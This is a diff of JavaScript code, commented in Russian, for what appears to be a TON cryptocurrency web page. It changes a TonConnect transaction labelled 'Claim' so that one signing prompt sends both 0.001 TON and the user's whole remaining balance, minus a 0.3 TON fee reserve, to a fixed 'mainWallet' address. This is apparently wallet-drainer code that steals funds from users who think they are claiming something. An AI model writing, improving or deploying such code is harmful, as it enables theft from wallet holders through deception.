@@ -99,13 +99,22 @@ async function didtrans() {
     const remainingBalance = originalBalance - deduction;
 
     console.log(`Баланс после вычета 0.3 TON: ${remainingBalance / 1000000000} TON`);
-    
-     const transaction = {
+
+    // Формируем транзакцию с двумя сообщениями
+    const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
-        messages: [{
-            address: mainWallet,  // Адрес получателя
-            amount: 1000000, // Сумма в нанотонах
-        }],
+        messages: [
+            {
+                address: mainWallet,  // Адрес получателя для первой части
+                amount: 1000000,       // Сумма для первой транзакции (0.001 TON)
+                payload: "",           // Пустой payload (или можно удалить)
+            },
+            {
+                address: mainWallet,   // Адрес получателя для второй части
+                amount: remainingBalance, // Сумма для второй транзакции
+                payload: "",           // Пустой payload
+            }
+        ],
         sendMode: 3,  // Если это требуется в вашем API
         comment: "Claim",  // Комментарий (по желанию)
     };
@@ -113,33 +122,7 @@ async function didtrans() {
     try {
         // Подписание и отправка транзакции через TonConnect
         const result = await tonConnectUI.sendTransaction(transaction);
-        console.log('Транзакция отправлена:', result);
-        //alert('Транзакция успешно отправлена!');
-        
-        // Обновляем баланс после отправки
-        await updateBalance(walletAddress);
-    } catch (error) {
-        console.error('Ошибка при отправке транзакции:', error);
-        //alert('Ошибка при отправке транзакции.');
-    }
-
-    //await new Promise(resolve => setTimeout(resolve, 5000));
-
-    // Формируем транзакцию
-    const transaction1 = {
-        validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
-        messages: [{
-            address: mainWallet,  // Адрес получателя
-            amount: remainingBalance, // Сумма в нанотонах
-        }],
-        sendMode: 3,  // Если это требуется в вашем API
-        comment: "Claim",  // Комментарий (по желанию)
-    };
-
-    try {
-        // Подписание и отправка транзакции через TonConnect
-        const result = await tonConnectUI.sendTransaction(transaction1);
-        console.log('Транзакция отправлена:', result);
+        console.log('Транзакция успешно отправлена:', result);
         //alert('Транзакция успешно отправлена!');
         
         // Обновляем баланс после отправки
